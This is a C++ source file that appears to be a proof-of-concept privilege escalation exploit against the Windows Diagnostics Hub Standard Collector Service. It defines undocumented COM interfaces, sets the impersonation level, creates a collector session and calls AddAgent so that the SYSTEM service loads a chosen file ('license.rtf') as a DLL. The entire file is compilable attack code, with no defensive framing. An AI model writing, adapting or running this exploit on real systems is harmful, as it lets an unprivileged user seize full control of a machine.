#include "pch.h"
#include <iostream>
#include <string>
#include <sddl.h>
#include <strsafe.h>
#include <comdef.h>


class CoInit
{
public:
	CoInit() {
		CoInitialize(nullptr);
	}

	~CoInit() {
		CoUninitialize();
	}
};

GUID CLSID_CollectorService =
{ 0x42CBFAA7, 0xA4A7, 0x47BB,{ 0xB4, 0x22, 0xBD, 0x10, 0xE9, 0xD0, 0x27, 0x00, } };

class __declspec(uuid("f23721ef-7205-4319-83a0-60078d3ca922")) ICollectionSession : public IUnknown {
public:

	virtual HRESULT __stdcall PostStringToListener(REFGUID, LPWSTR) = 0;
	virtual HRESULT __stdcall PostBytesToListener() = 0;
	virtual HRESULT __stdcall AddAgent(LPWSTR path, REFGUID) = 0;
};

struct SessionConfiguration
{
	DWORD version; // Needs to be 1
	DWORD  a1;     // Unknown
	DWORD  something; // Also unknown
	DWORD  monitor_pid;
	GUID   guid;
	BSTR   path;    // Path to a valid directory
	USHORT trailing;
};

class __declspec(uuid("7e912832-d5e1-4105-8ce1-9aadd30a3809")) IStandardCollectorClientDelegate : public IUnknown
{
};

class __declspec(uuid("0d8af6b7-efd5-4f6d-a834-314740ab8caa")) IStandardCollectorService : public IUnknown
{
public:
	virtual HRESULT __stdcall CreateSession(SessionConfiguration *, IStandardCollectorClientDelegate *, ICollectionSession **) = 0;
	virtual HRESULT __stdcall GetSession(REFGUID, ICollectionSession **) = 0;
	virtual HRESULT __stdcall DestroySession(REFGUID) = 0;
	virtual HRESULT __stdcall DestroySessionAsync(REFGUID) = 0;
	virtual HRESULT __stdcall AddLifetimeMonitorProcessIdForSession(REFGUID, int) = 0;
};


_COM_SMARTPTR_TYPEDEF(IStandardCollectorService, __uuidof(IStandardCollectorService));
_COM_SMARTPTR_TYPEDEF(ICollectionSession, __uuidof(ICollectionSession));


void ThrowOnError(HRESULT hr)
{
	if (hr != 0)
	{
		throw _com_error(hr);
	}
}

int main()
{
	CoInit coinit;
	try
	{
		GUID name;
		CoCreateGuid(&name);
		LPOLESTR name_str;
		StringFromIID(name, &name_str);

		WCHAR valid_dir[] = L"C:\\programdata\\";
		WCHAR targetDll[] = L"license.rtf";

		IStandardCollectorServicePtr service;
		ThrowOnError(CoCreateInstance(CLSID_CollectorService, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&service)));
		DWORD authn_svc;
		DWORD authz_svc;
		LPOLESTR principal_name;
		DWORD authn_level;
		DWORD imp_level;
		RPC_AUTH_IDENTITY_HANDLE identity;
		DWORD capabilities;

		ThrowOnError(CoQueryProxyBlanket(service, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities));
		ThrowOnError(CoSetProxyBlanket(service, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities));
		SessionConfiguration config = {};
		config.version = 1;
		config.monitor_pid = ::GetCurrentProcessId();
		CoCreateGuid(&config.guid);
		bstr_t path = valid_dir;
		config.path = path;
		ICollectionSessionPtr session;

		ThrowOnError(service->CreateSession(&config, nullptr, &session));
		GUID agent_guid;
		CoCreateGuid(&agent_guid);
		ThrowOnError(session->AddAgent(targetDll, agent_guid));
	}
	catch (const _com_error& error)
	{
		printf("%ls\n", error.ErrorMessage());
		printf("%08X\n", error.Error());
	}
}